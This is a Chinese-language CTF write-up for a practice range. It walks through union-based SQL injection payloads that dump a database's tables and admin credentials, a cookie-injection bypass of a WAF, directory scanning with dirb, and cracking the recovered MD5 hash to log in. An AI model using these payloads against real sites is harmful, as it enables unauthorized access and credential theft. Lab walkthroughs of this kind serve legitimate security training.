---
title: 掌控安全-封神台靶场(免费版) WP
date: 2026-08-07
categories: ["CTF-Writeups"]
permalink: /ctf-writeups/fengshentai-wp
recommend: 90
---

# 第一章：为了女神小芳！
先简单测试一下
```
/?id=1 and 1=1
/?id=1 and 1=2
```
两次页面回显不同，发现存在SQL注入，
先看一下数据库有多少字段
```
/?id=1 and 1=1 order by 2 # 3就有回显了，说明长度就是2
```
接下来让我们看看哪个位置有回显
```
/?id=1 and 1=2 union select database(),version()
```
结果只返回了`5.5.53`说明只有2能返回信息
![](/images/20260723143705.webp)
所以接下来我们查看一下数据库名
```
/?id=1 and 1=2 union select 1,database() # 拿到数据库maoshe
```
![](/images/20260723143845.webp)
接下来我们查看表名
```
/?id=1 and 1=2 union select 1,group_concat(table_name) from information_schema.tables where table_schema='maoshe'
```
![](/images/20260723144122.webp)
接着我们查看列名(看样子秘密就藏在admin里面，我们就直接看这个就好了)
```
/?id=1 and 1=2 union select 1,group_concat(column_name) from information_schema.columns where table_schema='maoshe' and table_name='admin'
```
![](/images/20260723144553.webp)
最后让我们看看这些参数里面有什么吧
```
/?id=1 and 1=2 union select 1,group_concat(Id,username,password ) from admin
```
![](/images/20260723144734.webp)
拿下！！！
# 第二章：遇到阻难！绕过WAF过滤！
![](/images/20260723154107.webp)
刚点进来的时候，可能会一脸懵逼，但是没关系，我们多点点网站的内容，看存不存在什么可疑的地方
![](/images/20260723154358.webp)
随后我发现，这个?id=170会不会存在sql注入，所以我们可以试一下
```
/shownews.asp?id=170 and 1=1 
```
不过被拦截了
![](/images/20260723154835.webp)
and被拦截了，我们可以使用`order by`看看数据库的字段
```
/shownews.asp?id=171 order by 10 # 11时页面回显不同，说明字段就是10个
```
可以执行，说明`order by`是可以用的，可惜的是，union select也被拦截了，难道就没有办法了吗？既然是存在SQL注入的，那我们可以试一下Cookie注入，抓包看一下
![](/images/20260723160433.webp)
是可以正常访问的
```
id=170+union+select+1,2,3,4,5,6,7,8,9,10
```
奇怪的是，不管我把哪个字段换成database()页面都是数据库错误，难道不是cookie注入？
于是抱着猜测的心理进行了最后一次尝试
```
id=170+union+select+1,2,3,4,5,6,7,8,9,10+from+admin
```
正常情况下这种网站都会存在一个admin的表吧？？？成功了
![](/images/20260723161829.webp)
于是我们就知道了在2，3，7，8，9字段是有回显的，所以我们可以猜一下有没有id、password等参数
```
id=170+union+select+1,username,password,4,5,6,7,8,9,10+from+admin
```
![](/images/20260723162319.webp)
页面返回了，username=admin、password=b9a2a2b5dffb918c
不过，问题又来了，我们拿到这些有什么用呢？总要有地方可以使用账密吧，我们可以扫描一下目录，看能不能找到后台什么的（用dirsearch扫了，没结果，小编的字典太小了）我们可以使用kali自带的DIRB对目标网址扫描，最后找到admin/Login.asp,输入账号密码，不过这个密码好像是错的，16位的用随波逐流梭哈一下，原来是md5
![](/images/20260723164922.webp)
密码其实是welcome，就拿到flag了！！！

